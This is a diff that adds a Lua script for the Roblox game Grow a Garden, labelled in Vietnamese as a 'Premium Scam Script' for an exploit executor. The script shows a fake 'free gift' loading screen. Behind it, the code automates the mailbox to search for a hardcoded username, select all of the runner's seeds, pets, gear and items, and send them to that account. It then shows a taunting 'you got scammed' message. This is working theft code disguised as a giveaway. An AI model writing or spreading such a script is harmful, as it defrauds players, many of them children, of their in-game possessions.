@@ -1,0 +1,446 @@
+-- Grow a Garden 2 - Premium Scam Script
+-- Dành cho Delta Executor
+
+local player = game.Players.LocalPlayer
+local targetUser = "XQXQXQTTT"
+
+-- ===== MÀN HÌNH LOADING VUI NHỘN =====
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "PremiumScamLoader"
+loadingGui.Parent = player:WaitForChild("PlayerGui")
+loadingGui.Enabled = true
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BackgroundTransparency = 0.2
+bg.BorderSizePixel = 0
+bg.Parent = loadingGui
+
+-- Hiệu ứng confetti vui nhộn
+local colors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255), Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255)}
+for i = 1, 30 do
+    local confetti = Instance.new("Frame")
+    confetti.Size = UDim2.new(0, math.random(3, 8), 0, math.random(3, 8))
+    confetti.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    confetti.BackgroundColor3 = colors[math.random(1, #colors)]
+    confetti.BorderSizePixel = 0
+    confetti.Rotation = math.random(0, 360)
+    confetti.Parent = bg
+    
+    spawn(function()
+        while confetti do
+            confetti.Rotation = confetti.Rotation + math.random(-5, 5)
+            confetti.Position = UDim2.new(
+                confetti.Position.X.Scale + math.random(-0.01, 0.01),
+                0,
+                confetti.Position.Y.Scale + math.random(-0.01, 0.01),
+                0
+            )
+            wait(0.1)
+        end
+    end)
+end
+
+-- Tiêu đề vui nhộn
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0.8, 0, 0.1, 0)
+title.Position = UDim2.new(0.1, 0, 0.1, 0)
+title.BackgroundTransparency = 1
+title.Text = "🎉 CHÀO MỪNG ĐẾN VỚI SỰ KIỆN ĐẶC BIỆT! 🎉"
+title.TextColor3 = Color3.fromRGB(255, 200, 0)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.TextStrokeTransparency = 0.3
+title.TextStrokeColor3 = Color3.fromRGB(255, 100, 0)
+title.Parent = bg
+
+-- Subtitle
+local subTitle = Instance.new("TextLabel")
+subTitle.Size = UDim2.new(0.6, 0, 0.05, 0)
+subTitle.Position = UDim2.new(0.2, 0, 0.2, 0)
+subTitle.BackgroundTransparency = 1
+subTitle.Text = "⭐ NHẬN QUÀ FREE 100% ⭐"
+subTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+subTitle.TextScaled = true
+subTitle.Font = Enum.Font.Gotham
+subTitle.Parent = bg
+
+-- Emoji animation
+local emoji = Instance.new("TextLabel")
+emoji.Size = UDim2.new(0.2, 0, 0.1, 0)
+emoji.Position = UDim2.new(0.4, 0, 0.25, 0)
+emoji.BackgroundTransparency = 1
+emoji.Text = "🎁"
+emoji.TextColor3 = Color3.fromRGB(255, 255, 255)
+emoji.TextScaled = true
+emoji.Font = Enum.Font.Gotham
+emoji.Parent = bg
+
+spawn(function()
+    local emojis = {"🎁", "🎈", "🎉", "🎊", "✨", "💎"}
+    while emoji do
+        emoji.Text = emojis[math.random(1, #emojis)]
+        wait(0.5)
+    end
+end)
+
+-- Loading bar
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.7, 0, 0.04, 0)
+barBg.Position = UDim2.new(0.15, 0, 0.4, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+barBg.BorderSizePixel = 0
+barBg.Parent = bg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(0.1, 0, 0.04, 0)
+percentText.Position = UDim2.new(0.87, 0, 0.4, 0)
+percentText.BackgroundTransparency = 1
+percentText.TextColor3 = Color3.fromRGB(0, 255, 100)
+percentText.Text = "0%"
+percentText.TextScaled = true
+percentText.Font = Enum.Font.GothamBold
+percentText.Parent = bg
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(0.8, 0, 0.05, 0)
+statusText.Position = UDim2.new(0.1, 0, 0.47, 0)
+statusText.BackgroundTransparency = 1
+statusText.TextColor3 = Color3.fromRGB(200, 255, 200)
+statusText.Text = "Đang chuẩn bị quà tặng..."
+statusText.TextScaled = true
+statusText.Font = Enum.Font.Gotham
+statusText.Parent = bg
+
+-- Danh sách status vui nhộn
+local funnyStatus = {
+    "Đang nạp xu miễn phí...",
+    "Đang mở khoá VIP...",
+    "Đang tải pet huyền thoại...",
+    "Đang nhân đôi phần thưởng...",
+    "Đang kích hoạt mã quà tặng...",
+    "Đang chuẩn bị bất ngờ...",
+    "Sắp có quà siêu to khổng lồ...",
+    "Đang tối ưu hoá nhận quà...",
+    "Sắp xong rồi, chờ chút nhé...",
+    "Chuẩn bị nhận quà thôi nào!"
+}
+
+-- ===== CHỨC NĂNG CHÍNH =====
+
+-- Bấm nút Garden
+local function clickGardenButton()
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    for _, v in pairs(playerGui:GetDescendants()) do
+        if v:IsA("ImageButton") or v:IsA("TextButton") then
+            local text = v.Text:lower()
+            local name = v.Name:lower()
+            if text:find("garden") or name:find("garden") or text:find("vườn") or name:find("vuon") then
+                local detector = v:FindFirstChildOfClass("ClickDetector")
+                if detector then
+                    fireclickdetector(detector)
+                    return true
+                end
+            end
+        end
+    end
+    
+    -- Thử tìm bằng cách khác
+    for _, v in pairs(playerGui:GetDescendants()) do
+        if v:IsA("ImageLabel") or v:IsA("TextLabel") then
+            local text = v.Text:lower()
+            if text:find("garden") or text:find("vườn") then
+                -- Click vào parent button
+                local parent = v.Parent
+                if parent:IsA("ImageButton") or parent:IsA("TextButton") then
+                    local detector = parent:FindFirstChildOfClass("ClickDetector")
+                    if detector then
+                        fireclickdetector(detector)
+                        return true
+                    end
+                end
+            end
+        end
+    end
+    
+    return false
+end
+
+-- Di chuyển đến hòm thư
+local function moveToMailbox()
+    local char = player.Character
+    if not char then
+        char = player.CharacterAdded:Wait()
+    end
+    
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    -- Di chuyển sang phải
+    for i = 1, 50 do
+        hrp.CFrame = hrp.CFrame + Vector3.new(1, 0, 0)
+        
+        -- Tìm hòm thư
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") and (v.Name:lower():find("mailbox") or v.Name:lower():find("mail") or v.Name:lower():find("thư")) then
+                local dist = (v.Position - hrp.Position).Magnitude
+                if dist < 8 then
+                    hrp.CFrame = v.CFrame + Vector3.new(0, 3, 0)
+                    wait(0.3)
+                    
+                    -- Spam bấm E
+                    for j = 1, 10 do
+                        local detector = v:FindFirstChildOfClass("ClickDetector")
+                        if detector then
+                            fireclickdetector(detector)
+                        end
+                        wait(0.1)
+                    end
+                    return true
+                end
+            end
+        end
+        
+        wait(0.05)
+    end
+    return false
+end
+
+-- Tương tác với hòm thư UI
+local function interactWithMailUI()
+    wait(1)
+    
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    -- Tìm GUI hòm thư
+    local mailGui = nil
+    for _, v in pairs(playerGui:GetChildren()) do
+        if v:IsA("ScreenGui") then
+            local name = v.Name:lower()
+            if name:find("mail") or name:find("send") or name:find("gift") or name:find("thư") then
+                mailGui = v
+                break
+            end
+        end
+    end
+    
+    if not mailGui then
+        -- Thử tìm GUI đang mở
+        for _, v in pairs(playerGui:GetChildren()) do
+            if v:IsA("ScreenGui") and v.Enabled then
+                mailGui = v
+                break
+            end
+        end
+    end
+    
+    if mailGui then
+        -- Tìm thanh tìm kiếm ở góc phải
+        local searchBox = nil
+        for _, v in pairs(mailGui:GetDescendants()) do
+            if v:IsA("TextBox") then
+                local pos = v.AbsolutePosition
+                local size = v.AbsoluteSize
+                -- Kiểm tra nếu ở góc phải
+                if pos.X > 500 then
+                    searchBox = v
+                    break
+                end
+            end
+        end
+        
+        if searchBox then
+            -- Nhập tên vào thanh tìm kiếm
+            searchBox.Text = targetUser
+            wait(0.5)
+            
+            -- Tìm và bấm vào nhân vật đầu tiên
+            for _, v in pairs(mailGui:GetDescendants()) do
+                if v:IsA("ImageButton") or v:IsA("TextButton") then
+                    local text = v.Text:lower()
+                    local name = v.Name:lower()
+                    if text:find(targetUser:lower()) or name:find(targetUser:lower()) or text:find("xqxqxqttt") then
+                        local detector = v:FindFirstChildOfClass("ClickDetector")
+                        if detector then
+                            fireclickdetector(detector)
+                            wait(0.3)
+                            break
+                        end
+                    end
+                end
+            end
+            
+            -- Nếu không tìm thấy, thử bấm vào kết quả đầu tiên
+            for _, v in pairs(mailGui:GetDescendants()) do
+                if v:IsA("ImageButton") or v:IsA("TextButton") then
+                    if v.Visible and v.AbsoluteSize.X > 50 then
+                        local detector = v:FindFirstChildOfClass("ClickDetector")
+                        if detector then
+                            fireclickdetector(detector)
+                            wait(0.3)
+                            break
+                        end
+                    end
+                end
+            end
+            
+            wait(0.5)
+            
+            -- Vét sạch đồ ở góc phải
+            local itemsSelected = 0
+            for _, v in pairs(mailGui:GetDescendants()) do
+                if v:IsA("ImageButton") or v:IsA("TextButton") then
+                    local name = v.Name:lower()
+                    local text = v.Text:lower()
+                    
+                    -- Kiểm tra item, seed, gear, pet
+                    if name:find("seed") or name:find("fruit") or name:find("gear") or name:find("pet") or name:find("item") or name:find("crop") or name:find("plant") or name:find("hat") or name:find("tool") then
+                        -- Kiểm tra vị trí góc phải
+                        local pos = v.AbsolutePosition
+                        if pos.X > 400 then
+                            local detector = v:FindFirstChildOfClass("ClickDetector")
+                            if detector then
+                                fireclickdetector(detector)
+                                itemsSelected = itemsSelected + 1
+                                wait(0.02)
+                                
+                                -- Kéo lên (scroll)
+                                if itemsSelected % 5 == 0 then
+                                    -- Mô phỏng scroll
+                                    for _, scrollBar in pairs(mailGui:GetDescendants()) do
+                                        if scrollBar:IsA("ScrollingFrame") or scrollBar:IsA("Frame") then
+                                            if scrollBar.AbsoluteSize.Y > 200 then
+                                                scrollBar.CanvasPosition = Vector2.new(0, math.max(0, scrollBar.CanvasPosition.Y - 50))
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            
+            -- Tìm nút gửi
+            for _, v in pairs(mailGui:GetDescendants()) do
+                if v:IsA("TextButton") or v:IsA("ImageButton") then
+                    local text = v.Text:lower()
+                    if text:find("send") or text:find("gửi") or text:find("confirm") then
+                        local detector = v:FindFirstChildOfClass("ClickDetector")
+                        if detector then
+                            fireclickdetector(detector)
+                            break
+                        end
+                    end
+                end
+            end
+            
+            -- Tìm nút màu xanh
+            for _, v in pairs(mailGui:GetDescendants()) do
+                if v:IsA("TextButton") or v:IsA("ImageButton") then
+                    local bgColor = v.BackgroundColor3
+                    if bgColor.R < 0.1 and bgColor.G > 0.5 and bgColor.B < 0.1 then
+                        local detector = v:FindFirstChildOfClass("ClickDetector")
+                        if detector then
+                            fireclickdetector(detector)
+                            break
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- ===== CHẠY LOADING VÀ THỰC THI =====
+
+-- Chạy loading chậm rãi
+for i = 1, 100 do
+    barFill.Size = UDim2.new(i/100, 0, 1, 0)
+    percentText.Text = i .. "%"
+    
+    -- Cập nhật status vui nhộn
+    if i % 10 == 0 then
+        statusText.Text = funnyStatus[math.random(1, #funnyStatus)]
+    end
+    
+    -- Khi loading đến 30% thì bấm nút Garden
+    if i == 30 then
+        spawn(function()
+            clickGardenButton()
+        end)
+    end
+    
+    -- Khi loading đến 50% thì di chuyển đến hòm thư
+    if i == 50 then
+        spawn(function()
+            moveToMailbox()
+        end)
+    end
+    
+    -- Khi loading đến 70% thì tương tác với hòm thư
+    if i == 70 then
+        spawn(function()
+            interactWithMailUI()
+        end)
+    end
+    
+    wait(0.08) -- Chậm rãi
+end
+
+-- Kết thúc loading
+wait(0.5)
+loadingGui:Destroy()
+
+-- ===== CHỬI =====
+wait(0.3)
+
+-- Tạo GUI chửi
+local scamGui = Instance.new("ScreenGui")
+scamGui.Name = "ScamMessage"
+scamGui.Parent = player:WaitForChild("PlayerGui")
+
+local scamFrame = Instance.new("Frame")
+scamFrame.Size = UDim2.new(1, 0, 1, 0)
+scamFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+scamFrame.BackgroundTransparency = 0.3
+scamFrame.BorderSizePixel = 0
+scamFrame.Parent = scamGui
+
+local scamText = Instance.new("TextLabel")
+scamText.Size = UDim2.new(0.8, 0, 0.3, 0)
+scamText.Position = UDim2.new(0.1, 0, 0.35, 0)
+scamText.BackgroundTransparency = 1
+scamText.Text = "MÀY ĐÃ BỊ SCAM 🖕"
+scamText.TextColor3 = Color3.fromRGB(255, 0, 0)
+scamText.TextScaled = true
+scamText.Font = Enum.Font.GothamBold
+scamText.TextStrokeTransparency = 0
+scamText.TextStrokeColor3 = Color3.fromRGB(200, 0, 0)
+scamText.Parent = scamFrame
+
+-- Hiệu ứng nhấp nháy
+spawn(function()
+    while scamText do
+        scamText.TextTransparency = math.random(0, 0.3)
+        wait(0.2)
+    end
+end)
+
+-- Thông báo
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "SCAM THÀNH CÔNG!",
+    Text = "Đã gửi tất cả đồ cho " .. targetUser .. " 🖕",
+    Duration = 10
+})
+
+print("SCAM THÀNH CÔNG! Đã gửi đồ cho " .. targetUser)
+
